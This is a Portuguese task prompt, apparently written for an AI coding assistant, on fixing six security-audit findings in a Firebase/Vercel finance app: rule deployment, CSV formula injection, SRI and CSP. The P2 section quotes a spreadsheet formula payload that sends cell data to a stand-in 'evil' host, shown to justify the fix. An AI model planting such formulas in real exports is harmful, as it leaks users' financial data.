# PROMPT — corrigir os achados da auditoria de segurança

> Auditoria de **19/09/2026**. O relatório completo está em
> `docs/security-audit/relatorio-auditoria-seguranca.pdf`, e os achados em dado,
> com trecho de código e evidência, em `docs/security-audit/dados-auditoria.mjs`.
> As issues já escritas estão em `docs/security-audit/issues-github.mjs`.
>
> **Leia este arquivo inteiro antes de mexer em qualquer linha.** Ele diz o que
> corrigir, em que ordem, o que NÃO fazer e como provar que funcionou.

---

## O que você está corrigindo

Seis achados. **Nenhum crítico, e nenhum XSS** — a auditoria varreu as 61
ocorrências de `innerHTML` e a disciplina de `esc()` se sustentou em todas.
O que sobrou:

| # | Sev. | Onde | O quê |
|---|---|---|---|
| A1 | **Alta** | `firestore.rules`, `firebase.json` (ausente) | as regras não têm caminho de publicação |
| A2 | Média | `js/mes.js:595` | injeção de fórmula no CSV exportado |
| A3 | Média | `index.html:9,11`, `ferramentas/dump-fatura.html:7` | CDN sem Subresource Integrity |
| A4 | Baixa | `vercel.json:24` | `img-src https:` aberto; `style-src` com `'unsafe-inline'` |
| A5 | Baixa | fora do repositório | trava de origem da chave do Firebase não verificada |
| A6 | Informativa | — | **não exige ação**, ver o fim deste arquivo |

---

## Restrições da casa (valem para toda correção aqui)

Estão em `CLAUDE.md` e **nenhuma delas é negociável nesta tarefa**:

1. **Nenhum framework, nenhum bundler, nenhum build step.**
2. **Nenhuma dependência nova sem justificar** por que não dá com o que existe.
   A única exceção prevista aqui é `@firebase/rules-unit-testing`, e só como
   dependência de desenvolvimento do passo P5 — o app servido continua sem
   `package.json` no caminho de execução.
3. **PDF.js e Chart.js vêm de CDN**, e os hosts estão refletidos no `script-src`
   da CSP em `vercel.json:24`: trocar de CDN exige editar a CSP junto.
4. Comentário em português explicando o **porquê** da decisão, não o quê.
   Toda correção abaixo deixa um comentário; o texto sugerido está junto.
5. `js/utils.js` não importa nenhum outro módulo do projeto.

---

## P1 — Publicar e automatizar as regras do Firestore (achado A1)

**É o único achado que importa de verdade.** Faça este primeiro, e não
comece os outros antes de fechar o item 1 abaixo.

### Por que

`firestore.rules` é o **único** controle de acesso do projeto: não há servidor
próprio, o cliente inteiro roda na máquina do usuário e fala direto com o
Firestore. O repositório **não tem `firebase.json`** e **não tem `.github/`**.
A Vercel publica só arquivos estáticos e nunca toca nas regras — então o
comando que o próprio `firestore.rules:10` manda rodar
(`firebase deploy --only firestore:rules`) **falha**, e a publicação só pode ter
sido manual, colada no console.

Se o que está publicado forem as regras de projeto novo do Firebase
(`allow read, write: if true`, ou a variante que só exige `request.auth != null`),
qualquer conta Google autenticada lê e escreve o ramo `users/{uid}` de qualquer
outra pessoa. `apiKey` e `projectId` são públicos por desenho e estão no código
servido, em `js/firebase-init.js:15-26`.

### O que fazer

1. **Conferir no console** (Firebase → Firestore → Regras) contra
   `firestore.rules`, regra a regra. **Pergunte à usuária o resultado antes de
   seguir** — você não tem acesso ao console, e este passo não se adivinha.
   - Se divergir: colar o conteúdo do arquivo e publicar **agora**.
2. Criar `firebase.json` na raiz:
   ```json
   { "firestore": { "rules": "firestore.rules" } }
   ```
3. Atualizar o comentário de `firestore.rules:10` para o caminho real de
   publicação (o comando passa a funcionar depois do item 2).
4. Acrescentar um workflow em `.github/workflows/` que rode
   `firebase deploy --only firestore:rules` a cada merge na `main`, com o token
   em secret do repositório. **Não commite o token.**

### Critérios de aceite

- [ ] `firebase.json` versionado, apontando para `firestore.rules`
- [ ] As regras publicadas conferem com o arquivo (confirmado pela usuária)
- [ ] `firebase deploy --only firestore:rules` roda sem erro a partir da raiz
- [ ] Workflow publica as regras no merge para `main`
- [ ] O comentário de `firestore.rules:10` não mente mais

---

## P2 — Neutralizar a fórmula no CSV (achado A2)

### Por que

`js/mes.js:595` trata a sintaxe do CSV (aspas duplicadas) mas não o **primeiro
caractere**. Célula começando com `=`, `+`, `-`, `@`, TAB ou CR é interpretada
como fórmula por Excel, LibreOffice Calc e Google Sheets — as aspas em volta não
impedem isso.

E a coluna `descricao` **não é digitada só pela usuária**: vem do parse de
fatura em PDF (`js/pdf-import.js`) e de extrato CSV/OFX/PDF (`js/parsers/`), ou
seja, de arquivo emitido por terceiro. Um nome de estabelecimento como
`=HYPERLINK("https://evil/?d="&A1;"Erro")` atravessa o app intacto — a gravação
não filtra, e `esc()` só atua na saída HTML — e vira fórmula viva na planilha.

### O que fazer

Um ponto só, dentro da própria `celula()`:

```js
// js/mes.js:595
// O apóstrofo desarma a fórmula sem mudar o que se lê na planilha. A descrição
// vem de arquivo do banco, não só do teclado: `=HYPERLINK(…)` num nome de
// estabelecimento viraria fórmula viva no Excel de quem exporta o mês. As aspas
// do CSV não protegem disso — é o primeiro caractere que a planilha olha.
const FORMULA = /^[=+\-@\t\r]/;
const celula = (v) => {
  const s = String(v ?? '');
  return `"${(FORMULA.test(s) ? "'" + s : s).replace(/"/g, '""')}"`;
};
```

**Não mexa na coluna `valor`**: ela é exportada com ponto decimal e sinal de
propósito, para a planilha ler número e não texto (comentário em `js/mes.js:601`).
O regex acima pega `-` e pegaria o valor negativo se ele passasse por `celula()`
— confirme que continua passando, e se passar, isente a coluna numérica em vez
de afrouxar o regex.

O backup de `js/db.js` é JSON e **não** é afetado.

### Critérios de aceite

- [ ] `celula()` prefixa toda célula que comece com `= + - @ \t \r`
- [ ] Um lançamento com descrição `=1+1` abre no Excel/Calc como texto `=1+1`
- [ ] A coluna `valor` continua sendo lida como número pela planilha
- [ ] Teste em `test/` cobrindo os seis caracteres, no padrão dos que já existem
      (Node puro, sem dependência — ver `test/saldos.test.mjs`)

---

## P3 — Subresource Integrity nos scripts de CDN (achado A3)

### Por que

Chart.js e PDF.js entram como `<script>` global sem `integrity` e sem
`crossorigin`. A CSP autoriza os dois hosts, o que está certo, **mas autorizar
o host não verifica o conteúdo**.

Os dois rodam no mesmo documento em que `js/firebase-init.js:33` publica
`window._FB` — a instância **autenticada** do Firestore. Um arquivo alterado no
CDN executa com acesso total ao ramo `users/{uid}` do usuário logado, e exfiltra
por `connect-src https://*.googleapis.com`, que a própria CSP libera.

### O que fazer

As duas bibliotecas já estão pinadas por versão, então o hash é estável:

```bash
curl -s https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js \
  | openssl dgst -sha384 -binary | openssl base64 -A
curl -s https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js \
  | openssl dgst -sha384 -binary | openssl base64 -A
```

Aplicar nos **três** pontos: `index.html:9`, `index.html:11` e
`ferramentas/dump-fatura.html:7` (esta última é servida publicamente pela Vercel
e carrega o mesmo PDF.js).

```html
<script src="…" integrity="sha384-…" crossorigin="anonymous"></script>
```

**Atenção ao worker do PDF.js:** `js/pdf-import.js:35` define
`pdfjsLib.GlobalWorkerOptions.workerSrc`. Confira qual URL ele aponta — se for
outro arquivo do mesmo CDN, ele **não** é coberto por SRI (worker não tem
`integrity`), e isso precisa ficar escrito num comentário, não descoberto de novo
daqui a seis meses.

Registre em `CLAUDE.md`, junto da restrição 4 de arquitetura, que **trocar a
versão do CDN exige regerar o hash**.

### Critérios de aceite

- [ ] As três tags com `integrity` (sha384) e `crossorigin="anonymous"`
- [ ] O app carrega e os gráficos desenham — Mês, Adiante e Guardado
- [ ] A importação de fatura em PDF funciona (é o que usa o worker)
- [ ] `ferramentas/dump-fatura.html` abre e lê um PDF
- [ ] Um hash errado de propósito bloqueia o carregamento (verificado no console)
- [ ] `CLAUDE.md` avisa que trocar a versão exige regerar o hash

---

## P4 — Apertar a CSP (achado A4)

### Por que

`script-src` já está sem `'unsafe-inline'` — foi o que motivou extrair
`js/firebase-init.js`. Sobraram dois itens em `vercel.json:24`, e **nenhum é
explorável sozinho**: são a camada que deixaria de conter um XSS caso apareça.

### O que fazer

**Agora (é de uma linha):** trocar `img-src 'self' data: https: blob:` por uma
lista dos hosts realmente usados. Confira quais são antes de escrever — o avatar
do Google (`https://lh3.googleusercontent.com`) é o candidato óbvio, mas
**verifique no código** em vez de assumir.

**Depois, e só depois de P1–P3:** sair do `'unsafe-inline'` em `style-src` exige
migrar para classe os atributos `style=` espalhados pelos módulos. Isso é
trabalho de uma rodada inteira, não um item de lista. **Não comece junto.**
Levante quantos existem hoje (`grep -c 'style="' js/*.js`) e registre o número
numa issue, para a decisão ser tomada com o custo à vista.

### Critérios de aceite

- [ ] `img-src` sem `https:` genérico
- [ ] O avatar da conta Google continua carregando (tela de Ajustes → Conta)
- [ ] Nenhum erro de CSP no console em nenhuma das sete telas
- [ ] O levantamento dos `style=` registrado, com o número medido

---

## P5 — Fixar as regras com teste (fecha A1 de vez)

### Por que

Hoje a garantia de que `firestore.rules` está certa é **uma leitura humana**.
O projeto já roda testes em Node puro (`test/saldos.test.mjs`,
`test/pdf-import.test.mjs`, `test/base-parser.test.mjs`), então existe o hábito
e existe o lugar. Sem isto, P1 é "conferido uma vez" em vez de "conferido a cada
commit".

### O que fazer

`@firebase/rules-unit-testing` sobre o emulador do Firestore. **É a única
dependência nova autorizada neste prompt**, e só de desenvolvimento — ela não
entra no que a Vercel serve.

Casos que precisam existir:

- usuário A **não** lê `users/{B}/transactions`
- usuário A **não** escreve em `users/{B}/*`
- usuário sem `email_verified` é negado
- transação com `amount` acima de 10.000.000 é rejeitada
- descrição acima de 500 caracteres é rejeitada
- documento fora de `/users` é negado

### Critérios de aceite

- [ ] Suíte rodando contra o emulador, invocável por um comando só
- [ ] Os seis casos acima passando
- [ ] A suíte roda no CI junto da publicação das regras (P1)
- [ ] Afrouxar qualquer `match` faz a suíte falhar — verificado quebrando de propósito

---

## P6 — Conferência de console (achado A5) — **não é código**

Nada a mudar no código-fonte. A chave em `js/firebase-init.js:15-26` é a chave
Web do Firebase: **pública por desenho**, identifica o projeto e não autoriza
nada. "Esconder" a chave não é correção e não deve ser tentado.

O que protege o projeto são dois controles que ficam **fora do repositório** e
que a auditoria não pôde verificar. Peça à usuária:

- [ ] Firebase → Authentication → Domínios autorizados: só o domínio da Vercel
      e `localhost`
- [ ] Google Cloud → Credenciais: chave restrita por referenciador HTTP
- [ ] Decisão sobre App Check (reCAPTCHA Enterprise) registrada — adotar ou
      dispensar, **com o porquê escrito**. Hoje não há App Check no projeto.

---

## O que NÃO fazer

- **A6 não pede ação.** A recusa de apagar linha de extrato (`js/mes.js:856-862`,
  `js/conferir.js:413-417`), a whitelist `WIPABLE_COLLECTIONS` (`js/db.js:489`) e
  a validação do restore (`js/db.js:607-643`) vivem só no cliente — mas o alvo é
  **o dado do próprio usuário**, e não há travessia de fronteira de dono. É
  invariante de consistência, não de segurança. Subir isso para as regras só faz
  sentido se um dia houver conta compartilhada. **Não "conserte".**
- **Não reescreva o `esc()`** nem acrescente biblioteca de sanitização. A
  auditoria varreu os 61 sinks e não achou um furo; trocar a defesa que funciona
  por outra é risco sem ganho.
- **Não mexa em parsing** — `competenciaDaFatura`, `_tolerancia`, `_acharParcela`,
  `dedupKey`, `detectDuplicates`, a ordem de `SECTION_HEADERS`. Nenhum achado
  toca nisso, e os testes que os fixam não devem precisar mudar.
- **Não abra `package.json` na raiz do app.** Se P5 exigir um, ele mora em
  `test/` ou em `tools/`, fora do caminho servido.

---

## Ao terminar

1. Rodar a suíte que já existe: os testes de `test/` precisam continuar passando.
2. Abrir o app e percorrer as **sete telas** (Importar, Conferir, Mês, Cartão,
   Adiante, Guardado, Ajustes) **nos dois temas**, com o console aberto: nenhum
   erro de CSP, nenhum gráfico em branco.
3. Exportar um CSV de Mês e abri-lo numa planilha.
4. Regerar o relatório com os achados fechados:
   - editar `docs/security-audit/dados-auditoria.mjs` (marcar o que caiu)
   - `node docs/security-audit/gerar-relatorio.mjs`
   - conferir o visual com `node docs/security-audit/rasterizar.mjs`
5. Atualizar em `CLAUDE.md` a seção **"Contexto pendente"**, dizendo o que
   fechou e o que continua aberto — do mesmo jeito que ela já registra os
   achados fechados da auditoria de 02/08/2026.
